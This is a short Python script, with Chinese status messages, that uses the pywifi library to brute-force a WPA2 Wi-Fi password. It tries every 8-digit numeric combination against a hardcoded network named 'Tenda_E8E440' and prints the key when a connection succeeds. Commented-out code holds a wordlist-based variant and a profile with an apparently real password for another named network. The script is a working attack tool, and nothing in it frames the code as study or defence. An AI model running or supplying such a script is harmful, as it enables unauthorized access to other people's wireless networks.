import pywifi
from pywifi import const
import time
import itertools as its


def getInterface():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    return interface


def testwifi(interface, wifiname, password):
    profile = pywifi.Profile()
    profile.ssid = wifiname
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    profile = interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(5)
    print(interface.status())
    if interface.status() == 4:
        print('good')
        return True
    else:
        return False


def beginWork(wifiname):
    interfaces = getInterface()
    words_num = '1234567890'
    dilib = its.product(words_num, repeat=8)
    for password in dilib:
        print(''.join(password))
        try:
            print('正在尝试%s,%s' % (wifiname, ''.join(password)))
            if testwifi(interfaces, wifiname, ''.join(password)):
                print('%s的密码是%s' % (wifiname, ''.join(password)))
                break
        except:
            continue


beginWork('Tenda_E8E440')

# profile = pywifi.Profile()
# profile.ssid = 'Xiaomi_A3F5'
# profile.auth = const.AUTH_ALG_OPEN
# profile.akm.append(const.AKM_TYPE_WPA2PSK)
# profile.cipher = const.CIPHER_TYPE_CCMP
# profile.key = '151Hhpon?'

# wifi = pywifi.PyWiFi()
# iface = wifi.interfaces()[0]
# profile = iface.add_network_profile(profile)
# iface.connect(profile)

# while True:
#     try:
#         password = files.readline()
#         password = password.strip('\n')
#         if not password:
#             break
#         print('正在尝试%s,%s' % (wifiname, password))
#         if testwifi(interfaces, wifiname, password):
#             break
#     except:
#         print('error')
#         continue
# files.close()
